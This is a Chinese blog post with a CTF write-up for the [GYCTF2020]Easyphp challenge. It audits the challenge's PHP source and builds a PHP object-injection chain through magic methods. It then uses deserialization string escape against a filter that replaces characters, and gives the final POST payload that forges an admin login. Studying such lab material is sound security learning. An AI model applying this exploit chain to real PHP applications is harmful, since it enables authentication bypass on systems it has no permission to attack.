---
title: '[GYCTF2020]Easyphp'
date: 2024-08-09 21:13:08
tags: 
      - 题解
      - 反序列化
categories: 刷题笔记
---

### [GYCTF2020]Easyphp

题目提示留下来后面，我们进行目录扫描，发现了www.zip文件，我们进行下载

![image-20240811205155352](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112052464.png)

下载后发现4个php文件，接下来就是万恶的代码审计了

<!--more-->

我们在update.php里面发现输出flag的代码

```
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}
```

所以我们需要做的就是成功登录，就能得到flag了

我们审计lib.php

```
<?php
error_reporting(0);
session_start();
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
    public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//危
    }
    public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
    public function update($sql)
    {
        //还没来得及写
    }
}

```

在UpdateHelper类里发现反序列化，在user类里发现了字符的替换和sql语句

这里最重要的一句话`safe(serialize(new Info($age,$nickname)))`显示将`Info`类进行序列化然后经过`safe`过滤，然后再回到`update`方法中反序列化，再看看`safe`函数

```
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
```

很明显，safe函数进行了字符的替换，所以这道题还需要用到反序列化字符逃逸来做

关键还是进行登录

虽然我们不知道admin的密码，但如果让login执行的sql语句是`select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?`，那么密码校验就能直接通过，token会被赋成admin。

```
<?php
class User
{
    public $age = null;
    public $nickname = null;
    public function __construct()
    {
        $this->age = 'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
        $this->nickname = new Info();
    }
}
class Info
{
    public $CtrlCase;
    public function __construct()
    {
        $this->CtrlCase = new dbCtrl();
    }
}
class UpdateHelper
{
    public $sql;
    public function __construct()
    {
        $this->sql = new User();
    }
}
class dbCtrl
{
    public $name = "admin";
    public $password = "1";
}
$o = new UpdateHelper;
echo serialize($o);

```

把UpdateHelper类的sql赋值成了一个User类，UpdateHelper类的\_\_destruct会echo this->sql,触发User类的\__toString。因为User类的nickname被赋值成了一个Info类，而Info类是没有update函数的，这时候会默认触发Info的__call函数，调用CtrlCase的login。CtrlCase已经实例化成dbCtrl，参数是User的age，我们改成'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'
这时候就达到目的

```
public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }

```

此时，我们得到了一个反序列化字符串

```
O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}

```

下一步是要让它绕过safe函数，这里终于要用到提过的字符串逃逸了

```
<?php
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
}

$a = new Info();
$a->age="1";
$a->nickname='********";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}';
echo serialize($a);

```

\是会被替换成hacker的，这样nickname的实际长度变长，但是s:271是固定的，所以后台一直认定nickname就是271个字符长。如果\的数量够多，那么我们后面的s:8:"CtrlCase";O:12:"UpdateHelper"就能逃逸出来，成功注入了一个UpdateHelper类。

```
";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}

```

长度是263个字符，`*`和hacker相差5个字符，into和hacker相差2个字符。所以一共要有4个into和51个`*`

```
age=1&nickname=***************************************************intointointointo";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}

```

post以后页面出现10-0代表成功，此时返回登录页面。此时token已经变成admin，用户名填admin，密码随意就可登录成功。

![image-20240811212222373](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112122595.png)

![image-20240811212241937](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112122967.png)

